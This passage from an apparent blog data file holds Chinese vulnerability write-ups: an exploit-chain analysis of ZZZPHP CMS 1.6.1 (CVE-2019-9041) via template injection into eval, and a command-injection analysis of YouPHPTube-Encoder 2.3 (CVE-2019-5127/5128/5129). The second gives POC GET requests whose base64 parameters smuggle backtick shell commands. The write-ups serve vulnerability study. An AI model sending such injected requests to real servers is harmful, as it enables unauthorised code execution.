$conf['iscache']==1\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/9.png)\n\n只要$conf['iscache']==1，就可以顺利的进入这个条件分支，parserCommom就能有机会被调用\n\n查看配置文件，此处默认为0\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/10.png)\n\n&nbsp;\n\n但是由于漏洞介绍，这是个后台漏洞，那默认我们可以有后台的操作权限\n\n于是我在后台管理那把缓存开启了\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/11.png)\n\n&nbsp;\n\n现在zzz_config.php中\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/12.png)\n\n可见iscache现在为1了。\n\n&nbsp;\n\n现在的思路：\n\n1、$conf['iscache'] 目前已经是1，稳稳的进入这个elseif分支\n\n2、由于此处执行点位于zzz_client.php中，而zzz_client.php文件中没有定义任何函数，代码逐行执行，一马平川。\n\n3、只有找到zzz_client.php被加载的地方，才能进入该elseif分支执行我们的parserCommom\n\n4、找到控制传入parserCommom方法中$zcontent值的方法，将构造好的$zcontent传入我们的eval中执行。\n\n&nbsp;\n\n首先要找zzz_client.php被加载的地方\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/14.png)\n\n看起来这四处都可以加载zzz_client.php\n\n我们首先选主入口index.php\n\n&nbsp;\n\n不出意外，直接执行到断点处\n\n此时传入load_file方法中$tplfile值为\n\nC:/wamp64/www/analysis/zzzphp/template/pc/cn2016/html/index.html\n\n加载的是index.html模板\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/15.png)\n\n&nbsp;\n\n也就是说，我们只要在index.html中加入payload，就可以触发底层的eval执行任意代码。\n\n&nbsp;\n\n找到后台编辑模板处\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/16.png)\n\n&nbsp;\n\n编辑index.html,插入payload\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/11-1.png)\n\n成功执行\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/19.png)![](http://blog.nsfocus.net/wp-content/uploads/2019/03/18-300x201.png)\n\n但是需要注意的是 如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/20.png)\n\n当cachefile在第一次执行create_file后，就会被成功创建\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/21-300x150.png)\n\n下一次再进入elseif($conf['iscache']==1)分支后,\n\n由于\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/22.png)\n\n这个if条件不满足\n\n不会再次调用$parser-&gt;parserCommom($zcontent)的。\n\n总结来说，此处可以远程代码执行，但是当cachefile被创建后，此处调用链失效。\n\n&nbsp;\n\n到此为止，我们找到了一处不同于原作者的利用链。但仅仅zzz_client中就有四个分支调用了存在漏洞的函数。\n\n也就是说，同一个漏洞触发点所生产的利用链远远不止两处，有兴趣的朋友也可以自己试试。\n\n&nbsp;\n\n## 总结\n\n在分析一个漏洞时，当找到存在漏洞的部位时，不妨仔细的检查下这个存在漏洞的方法在何处被调用，为什么被调用，实现了什么功能。不拘泥于漏洞作者给出的poc，也许可以找到其他的利用链进行利用。","slug":"ZZZPHP-CMS-1-6-1-Remote-Code-Execution","published":1,"updated":"2020-10-27T09:27:09.892Z","_id":"ckgrozu8y0029wsa91nkqh1c5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。<br>很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。<br>在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。</p>\n<p>很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。</p>\n<p>有时候，顺着一个瓜（漏洞触发点），还能摸到很多条藤（利用链）。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>近日在PacketStorm看到一个关于国产cms的cve</p>\n<p><a href=\"https://packetstormsecurity.com/files/151824/ZZZPHP-CMS-1.6.1-Remote-Code-Execution.html\">https://packetstormsecurity.com/files/151824/ZZZPHP-CMS-1.6.1-Remote-Code-Execution.html</a></p>\n<p>&nbsp;</p>\n<p><strong>cve编号:</strong></p>\n<p>CVE-2019-9041</p>\n<p>&nbsp;</p>\n<p><strong>cve描述</strong></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1024x124.png\"></p>\n<p>&nbsp;</p>\n<p>再看看packetstormsecurity上关于exploit的介绍</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/2.png\"></p>\n<p>根据描述，猜测该漏洞应为SSTI类</p>\n<p>如果有升级补丁参照看一下，这个漏洞就很明朗了。</p>\n<p>然而官网上最新版本只是2019-1-28更新的1.6.1，而1.6.1版本，正是存在漏洞的版本。</p>\n<p>之前完全没有听说过这个cms，这个漏洞又有cve。</p>\n<p>因此拿着个来举个例子，看看怎么<strong>顺瓜摸藤</strong>。</p>\n<p>&nbsp;</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>从漏洞发现者所提供的exploit来看，这个漏洞的触发应该是需要后台权限。漏洞触发点位于inc/zzz_template.php中的parserIfLabel方法中，并且需要修改search模板并通过搜索功能执行该利用点。</p>\n<p>首先先看下inc/zzz_template.php中的parserIfLabel方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/4.png\"></p>\n<p>可以看到有一处eval方法，这个应该是最终代码执行触发的地方。</p>\n<p>既然触发点已经找到了，那继续往上跟，找到可用的调用链</p>\n<p>&nbsp;</p>\n<p>parserIfLabel方法只在两处被调用</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/5.png\"></p>\n<p>&nbsp;</p>\n<p>先看位于第2238行的第二处调用</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/6.png\"></p>\n<p>这处在parserIfLabel方法自身内部，递归调用来解析嵌套。此处虽然调用了parserIfLabel方法，但是并不处于parserIfLabel方法的调用链的上层，因此排除。</p>\n<p>&nbsp;</p>\n<p>再看第一处：位于23行这处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/7.png\"></p>\n<p>parserCommom方法调用parserIfLabel方法并将$zcontent传入其中。</p>\n<p>&nbsp;</p>\n<p>再看看parserCommom方法在何处被调用</p>\n<p>跟入zzz_client.php中</p>\n<p>zzz_client.php中一共四处调用了parserCommom方法，每一处都将名为$zcontent的参数传入其中。</p>\n<p>&nbsp;</p>\n<p>这四处parserCommom分别位于四个ifelse条件中。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/8.png\"></p>\n<p>&nbsp;</p>\n<p>先一处处来看，首先选个短的看起来容易触发的条件分支先来。</p>\n<p>先看第二处，这里elseif中的条件最短，为 $conf[‘iscache’]==1</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/9.png\"></p>\n<p>只要$conf[‘iscache’]==1，就可以顺利的进入这个条件分支，parserCommom就能有机会被调用</p>\n<p>查看配置文件，此处默认为0</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/10.png\"></p>\n<p>&nbsp;</p>\n<p>但是由于漏洞介绍，这是个后台漏洞，那默认我们可以有后台的操作权限</p>\n<p>于是我在后台管理那把缓存开启了</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11.png\"></p>\n<p>&nbsp;</p>\n<p>现在zzz_config.php中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/12.png\"></p>\n<p>可见iscache现在为1了。</p>\n<p>&nbsp;</p>\n<p>现在的思路：</p>\n<p>1、$conf[‘iscache’] 目前已经是1，稳稳的进入这个elseif分支</p>\n<p>2、由于此处执行点位于zzz_client.php中，而zzz_client.php文件中没有定义任何函数，代码逐行执行，一马平川。</p>\n<p>3、只有找到zzz_client.php被加载的地方，才能进入该elseif分支执行我们的parserCommom</p>\n<p>4、找到控制传入parserCommom方法中$zcontent值的方法，将构造好的$zcontent传入我们的eval中执行。</p>\n<p>&nbsp;</p>\n<p>首先要找zzz_client.php被加载的地方</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/14.png\"></p>\n<p>看起来这四处都可以加载zzz_client.php</p>\n<p>我们首先选主入口index.php</p>\n<p>&nbsp;</p>\n<p>不出意外，直接执行到断点处</p>\n<p>此时传入load_file方法中$tplfile值为</p>\n<p>C:/wamp64/www/analysis/zzzphp/template/pc/cn2016/html/index.html</p>\n<p>加载的是index.html模板</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/15.png\"></p>\n<p>&nbsp;</p>\n<p>也就是说，我们只要在index.html中加入payload，就可以触发底层的eval执行任意代码。</p>\n<p>&nbsp;</p>\n<p>找到后台编辑模板处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/16.png\"></p>\n<p>&nbsp;</p>\n<p>编辑index.html,插入payload</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11-1.png\"></p>\n<p>成功执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/19.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/18-300x201.png\"></p>\n<p>但是需要注意的是 如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/20.png\"></p>\n<p>当cachefile在第一次执行create_file后，就会被成功创建</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/21-300x150.png\"></p>\n<p>下一次再进入elseif($conf[‘iscache’]==1)分支后,</p>\n<p>由于</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/22.png\"></p>\n<p>这个if条件不满足</p>\n<p>不会再次调用$parser-&gt;parserCommom($zcontent)的。</p>\n<p>总结来说，此处可以远程代码执行，但是当cachefile被创建后，此处调用链失效。</p>\n<p>&nbsp;</p>\n<p>到此为止，我们找到了一处不同于原作者的利用链。但仅仅zzz_client中就有四个分支调用了存在漏洞的函数。</p>\n<p>也就是说，同一个漏洞触发点所生产的利用链远远不止两处，有兴趣的朋友也可以自己试试。</p>\n<p>&nbsp;</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>在分析一个漏洞时，当找到存在漏洞的部位时，不妨仔细的检查下这个存在漏洞的方法在何处被调用，为什么被调用，实现了什么功能。不拘泥于漏洞作者给出的poc，也许可以找到其他的利用链进行利用。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/拖库1.jpg","excerpt":"<p>在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。<br>很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。<br>在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。</p>\n<p>很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。</p>\n<p>有时候，顺着一个瓜（漏洞触发点），还能摸到很多条藤（利用链）。</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>近日在PacketStorm看到一个关于国产cms的cve</p>\n<p><a href=\"https://packetstormsecurity.com/files/151824/ZZZPHP-CMS-1.6.1-Remote-Code-Execution.html\">https://packetstormsecurity.com/files/151824/ZZZPHP-CMS-1.6.1-Remote-Code-Execution.html</a></p>\n<p>&nbsp;</p>\n<p><strong>cve编号:</strong></p>\n<p>CVE-2019-9041</p>\n<p>&nbsp;</p>\n<p><strong>cve描述</strong></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1024x124.png\"></p>\n<p>&nbsp;</p>\n<p>再看看packetstormsecurity上关于exploit的介绍</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/2.png\"></p>\n<p>根据描述，猜测该漏洞应为SSTI类</p>\n<p>如果有升级补丁参照看一下，这个漏洞就很明朗了。</p>\n<p>然而官网上最新版本只是2019-1-28更新的1.6.1，而1.6.1版本，正是存在漏洞的版本。</p>\n<p>之前完全没有听说过这个cms，这个漏洞又有cve。</p>\n<p>因此拿着个来举个例子，看看怎么<strong>顺瓜摸藤</strong>。</p>\n<p>&nbsp;</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>从漏洞发现者所提供的exploit来看，这个漏洞的触发应该是需要后台权限。漏洞触发点位于inc/zzz_template.php中的parserIfLabel方法中，并且需要修改search模板并通过搜索功能执行该利用点。</p>\n<p>首先先看下inc/zzz_template.php中的parserIfLabel方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/4.png\"></p>\n<p>可以看到有一处eval方法，这个应该是最终代码执行触发的地方。</p>\n<p>既然触发点已经找到了，那继续往上跟，找到可用的调用链</p>\n<p>&nbsp;</p>\n<p>parserIfLabel方法只在两处被调用</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/5.png\"></p>\n<p>&nbsp;</p>\n<p>先看位于第2238行的第二处调用</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/6.png\"></p>\n<p>这处在parserIfLabel方法自身内部，递归调用来解析嵌套。此处虽然调用了parserIfLabel方法，但是并不处于parserIfLabel方法的调用链的上层，因此排除。</p>\n<p>&nbsp;</p>\n<p>再看第一处：位于23行这处</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/7.png\"></p>\n<p>parserCommom方法调用parserIfLabel方法并将$zcontent传入其中。</p>\n<p>&nbsp;</p>\n<p>再看看parserCommom方法在何处被调用</p>\n<p>跟入zzz_client.php中</p>\n<p>zzz_client.php中一共四处调用了parserCommom方法，每一处都将名为$zcontent的参数传入其中。</p>\n<p>&nbsp;</p>\n<p>这四处parserCommom分别位于四个ifelse条件中。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/8.png\"></p>\n<p>&nbsp;</p>\n<p>先一处处来看，首先选个短的看起来容易触发的条件分支先来。</p>\n<p>先看第二处，这里elseif中的条件最短，为 $conf[‘iscache’]==1</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/9.png\"></p>\n<p>只要$conf[‘iscache’]==1，就可以顺利的进入这个条件分支，parserCommom就能有机会被调用</p>\n<p>查看配置文件，此处默认为0</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/10.png\"></p>\n<p>&nbsp;</p>\n<p>但是由于漏洞介绍，这是个后台漏洞，那默认我们可以有后台的操作权限</p>\n<p>于是我在后台管理那把缓存开启了</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11.png\"></p>\n<p>&nbsp;</p>\n<p>现在zzz_config.php中</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/12.png\"></p>\n<p>可见iscache现在为1了。</p>\n<p>&nbsp;</p>\n<p>现在的思路：</p>\n<p>1、$conf[‘iscache’] 目前已经是1，稳稳的进入这个elseif分支</p>\n<p>2、由于此处执行点位于zzz_client.php中，而zzz_client.php文件中没有定义任何函数，代码逐行执行，一马平川。</p>\n<p>3、只有找到zzz_client.php被加载的地方，才能进入该elseif分支执行我们的parserCommom</p>\n<p>4、找到控制传入parserCommom方法中$zcontent值的方法，将构造好的$zcontent传入我们的eval中执行。</p>\n<p>&nbsp;</p>\n<p>首先要找zzz_client.php被加载的地方</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/14.png\"></p>\n<p>看起来这四处都可以加载zzz_client.php</p>\n<p>我们首先选主入口index.php</p>\n<p>&nbsp;</p>\n<p>不出意外，直接执行到断点处</p>\n<p>此时传入load_file方法中$tplfile值为</p>\n<p>C:/wamp64/www/analysis/zzzphp/template/pc/cn2016/html/index.html</p>\n<p>加载的是index.html模板</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/15.png\"></p>\n<p>&nbsp;</p>\n<p>也就是说，我们只要在index.html中加入payload，就可以触发底层的eval执行任意代码。</p>\n<p>&nbsp;</p>\n<p>找到后台编辑模板处</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/16.png\"></p>\n<p>&nbsp;</p>\n<p>编辑index.html,插入payload</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11-1.png\"></p>\n<p>成功执行</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/19.png\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/18-300x201.png\"></p>\n<p>但是需要注意的是 如下图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/20.png\"></p>\n<p>当cachefile在第一次执行create_file后，就会被成功创建</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/21-300x150.png\"></p>\n<p>下一次再进入elseif($conf[‘iscache’]==1)分支后,</p>\n<p>由于</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/22.png\"></p>\n<p>这个if条件不满足</p>\n<p>不会再次调用$parser-&gt;parserCommom($zcontent)的。</p>\n<p>总结来说，此处可以远程代码执行，但是当cachefile被创建后，此处调用链失效。</p>\n<p>&nbsp;</p>\n<p>到此为止，我们找到了一处不同于原作者的利用链。但仅仅zzz_client中就有四个分支调用了存在漏洞的函数。</p>\n<p>也就是说，同一个漏洞触发点所生产的利用链远远不止两处，有兴趣的朋友也可以自己试试。</p>\n<p>&nbsp;</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>在分析一个漏洞时，当找到存在漏洞的部位时，不妨仔细的检查下这个存在漏洞的方法在何处被调用，为什么被调用，实现了什么功能。不拘泥于漏洞作者给出的poc，也许可以找到其他的利用链进行利用。</p>"},{"title":"YouPHPTube-Encoder 远程代码执行漏洞分析(CVE-2019-5127/CVE-2019-5128/CVE-2019-5129)","date":"2019-11-08T03:14:14.000Z","cover":"https://s2.ax1x.com/2019/11/08/MVYvOU.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n近日，思科Talos漏洞报告指出，YouPHPTube Encoder应用存在多处命令注入漏洞。CVE编号分别为CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129\n\n<!--more-->\n\n## 漏洞描述\n\nYouPHPTube是一个开源的视频共享网站应用。使用YouPHPTube，用户可以创建自己的视频共享网站，YouPHPTube 将帮助用户导入和编码来自Youtube，Vimeo 等其他网站的视频，用户可以直接在自己的网站上进行分享。\n\nYouPHPTube Encoder是YouPHPTube的编码器插件，该插件可在YouPHPTube中提供编码器功能。使用者在自己的服务器上安装并使用YouPHPTube Encoder以取代第三方公共编码器服务器，可以更快速便捷的编码自己的视频，并且还可以使用私有方式对自己的视频进行编码\n\n[![MVCum4.md.png](https://s2.ax1x.com/2019/11/08/MVCum4.md.png)](https://imgchr.com/i/MVCum4)\n\n在YouPHPTube Encoder2.3中，存在无需身份验证的命令注入漏洞。攻击者可以发送包含特定参数的Web请求来触发这些漏洞。\n\n## 漏洞分析\n\n### ffmpeg\n\nYouPHPTube-Encoder对视频进行处理的核心部分是使用ffmpeg，本次三个漏洞的产生，也是因为YouPHPTube-Encoder底层在执行ffmpeg命令时，没有进行参数过滤导致的。\n\nFFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。采用LGPL或GPL许可证。它提供了录制、转换以及流化音视频的完整解决方案。它包含了非常先进的音频/视频编解码库libavcodec，为了保证高可移植性和编解码质量，libavcodec里很多code都是从头开发的。\n\nffmpeg下载地址:\n\n<http://ffmpeg.org/download.html>\n\nFFmpeg使用方式\n\n[![MVClkR.md.png](https://s2.ax1x.com/2019/11/08/MVClkR.md.png)](https://imgchr.com/i/MVClkR)\n\n使用案例：\n\n从视频中截取一张352x240尺寸大小的，格式为jpg的图片   \n\nffmpeg -i test.asf -y -f image2 -t 0.001 -s 352x240 a.jpg\n\n### CVE-2019-5127\n\n首先来看下CVE-2019-5127\n\n[![MVCCwj.md.png](https://s2.ax1x.com/2019/11/08/MVCCwj.md.png)](https://imgchr.com/i/MVCCwj)\n\n根据cve描述，可以确定漏洞存在的位置：\\\\objects\\\\getImage.php\n\n存在漏洞的参数：base64Url\n\n跟入getImage.php\n\n[![MVCPTs.md.png](https://s2.ax1x.com/2019/11/08/MVCPTs.md.png)](https://imgchr.com/i/MVCPTs)\n\n位于getImage.php文件25行处，可见从GET请求中读取base64Url参数，并将其base64解码，随后赋值给url变量，这里的base64Url参数便是CVE描述中所说的存在漏洞的参数\n\n[![MVCFkn.md.png](https://s2.ax1x.com/2019/11/08/MVCFkn.md.png)](https://imgchr.com/i/MVCFkn)\n\n通过GET请求中format参数的不同，选择不同的if分支进行视频处理\n\n我们以format参数值为png举例，如上图红框处\n\nffmpeg -i {\\$url} -f image2 -s 400x225 -vframes 1 -y {\\$destination}\n\n把视频的前1帧转换成一张400x225尺寸大小的，格式为jpg的图片 ，待转换的视频地址由\\$url变量值提供。这里的\\$url值可以通过GET变量传入，而未经过任何过滤\n\n\\$exec变量在拼接完成后，在后文被执行\n\n![MVCkYq.png](https://s2.ax1x.com/2019/11/08/MVCkYq.png)\n\n如上图可见，\\$exec变量被拼接后传递给\\$cmd\n\n程序通过exec方法将\\$cmd变量中的内容执行\n\n由于程序未使用escapeshellage或是escapeshellcmd进行过滤，导致远程代码执行漏洞的产生\n\n#### POC\n\n利用如下poc，即可对系统进行测试\n\nGET /YouPHPTube-Encoder/objects/getImage.php?base64Url=\n\nYGVjaG8gdGVzdCB8IHRlZSAtYSBrdW1hbW9uLmZ1bmA=&format=png\n\n### CVE-2019-5128\n\n接下来看下CVE-2019-5128\n\n[![MVCAf0.md.png](https://s2.ax1x.com/2019/11/08/MVCAf0.md.png)](https://imgchr.com/i/MVCAf0)\n\n根据cve描述，可以确定漏洞存在的位置：\\\\objects\\\\getImageMP4.php\n\n存在漏洞的参数：base64Url\n\ngetImageMP4.php\n\n[![MVCPTs.md.png](https://s2.ax1x.com/2019/11/08/MVCPTs.md.png)](https://imgchr.com/i/MVCPTs)\n\n存在问题的参数仍然是base64Url，如上图\n\n同上一个CVE类似，最终未经过滤，被拼接语句执行\n\n[![MVCZlT.md.png](https://s2.ax1x.com/2019/11/08/MVCZlT.md.png)](https://imgchr.com/i/MVCZlT)\n\n#### POC\n\n利用如下poc，即可对系统进行测试\n\nGET\n/YouPHPTube-Encoder/objects/getImageMP4.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg\n\n### CVE-2019-5129\n\n最后看下CVE-2019-5129\n\n[![MVC9mQ.md.png](https://s2.ax1x.com/2019/11/08/MVC9mQ.md.png)](https://imgchr.com/i/MVC9mQ)\n\n根据cve描述，可以确定漏洞存在的位置：\\\\objects\\\\ getSpiritsFromVideo.php\n\n存在漏洞的参数：base64Url\n\ngetSpiritsFromVideo.php\n\n![MVCSOg.png](https://s2.ax1x.com/2019/11/08/MVCSOg.png)\n\n存在问题的参数为base64Url，如上图\n\n[![MVCK0J.md.png](https://s2.ax1x.com/2019/11/08/MVCK0J.md.png)](https://imgchr.com/i/MVCK0J)\n\n拼接命令，在未经过滤的情况下，通过exec执行命令\n\n#### POC\n\n利用如下poc，即可对系统进行测试\n\n/YouPHPTube-Encoder/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg\n\n修复：\n\n官方暂时仍未修复以上漏洞","source":"_posts/YouPHPTube-Encoder.md","raw":"---\ntitle: YouPHPTube-Encoder 远程代码执行漏洞分析(CVE-2019-5127/CVE-2019-5128/CVE-2019-5129)\ndate: 2019-11-08 11:14:14\ntags: web漏洞分析\ncategories: 技术\ncover: https://s2.ax1x.com/2019/11/08/MVYvOU.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n近日，思科Talos漏洞报告指出，YouPHPTube Encoder应用存在多处命令注入漏洞。CVE编号分别为CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129\n\n<!--more-->\n\n## 漏洞描述\n\nYouPHPTube是一个开源的视频共享网站应用。使用YouPHPTube，用户可以创建自己的视频共享网站，YouPHPTube 将帮助用户导入和编码来自Youtube，Vimeo 等其他网站的视频，用户可以直接在自己的网站上进行分享。\n\nYouPHPTube Encoder是YouPHPTube的编码器插件，该插件可在YouPHPTube中提供编码器功能。使用者在自己的服务器上安装并使用YouPHPTube Encoder以取代第三方公共编码器服务器，可以更快速便捷的编码自己的视频，并且还可以使用私有方式对自己的视频进行编码\n\n[![MVCum4.md.png](https://s2.ax1x.com/2019/11/08/MVCum4.md.png)](https://imgchr.com/i/MVCum4)\n\n在YouPHPTube Encoder2.3中，存在无需身份验证的命令注入漏洞。攻击者可以发送包含特定参数的Web请求来触发这些漏洞。\n\n## 漏洞分析\n\n### ffmpeg\n\nYouPHPTube-Encoder对视频进行处理的核心部分是使用ffmpeg，本次三个漏洞的产生，也是因为YouPHPTube-Encoder底层在执行ffmpeg命令时，没有进行参数过滤导致的。\n\nFFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。采用LGPL或GPL许可证。它提供了录制、转换以及流化音视频的完整解决方案。它包含了非常先进的音频/视频编解码库libavcodec，为了保证高可移植性和编解码质量，libavcodec里很多code都是从头开发的。\n\nffmpeg下载地址:\n\n<http://ffmpeg.org/download.html>\n\nFFmpeg使用方式\n\n[![MVClkR.md.png](https://s2.ax1x.com/2019/11/08/MVClkR.md.png)](https://imgchr.com/i/MVClkR)\n\n使用案例：\n\n从视频中截取一张352x240尺寸大小的，格式为jpg的图片   \n\nffmpeg -i test.asf -y -f image2 -t 0.001 -s 352x240 a.jpg\n\n### CVE-2019-5127\n\n首先来看下CVE-2019-5127\n\n[![MVCCwj.md.png](https://s2.ax1x.com/2019/11/08/MVCCwj.md.png)](https://imgchr.com/i/MVCCwj)\n\n根据cve描述，可以确定漏洞存在的位置：\\\\objects\\\\getImage.php\n\n存在漏洞的参数：base64Url\n\n跟入getImage.php\n\n[![MVCPTs.md.png](https://s2.ax1x.com/2019/11/08/MVCPTs.md.png)](https://imgchr.com/i/MVCPTs)\n\n位于getImage.php文件25行处，可见从GET请求中读取base64Url参数，并将其base64解码，随后赋值给url变量，这里的base64Url参数便是CVE描述中所说的存在漏洞的参数\n\n[![MVCFkn.md.png](https://s2.ax1x.com/2019/11/08/MVCFkn.md.png)](https://imgchr.com/i/MVCFkn)\n\n通过GET请求中format参数的不同，选择不同的if分支进行视频处理\n\n我们以format参数值为png举例，如上图红框处\n\nffmpeg -i {\\$url} -f image2 -s 400x225 -vframes 1 -y {\\$destination}\n\n把视频的前1帧转换成一张400x225尺寸大小的，格式为jpg的图片 